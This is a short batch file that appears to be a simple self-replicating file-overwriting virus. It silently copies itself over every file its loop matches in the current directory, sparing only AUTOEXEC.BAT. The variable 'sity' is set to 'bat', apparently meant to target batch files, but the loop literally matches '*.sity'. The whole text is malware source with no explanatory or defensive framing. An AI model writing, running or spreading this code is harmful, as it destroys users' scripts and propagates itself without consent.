@echo off
set sity=bat
for %%b in (*.sity) do if not %%b==AUTOEXEC.BAT copy %0 %%b>nul
echo on
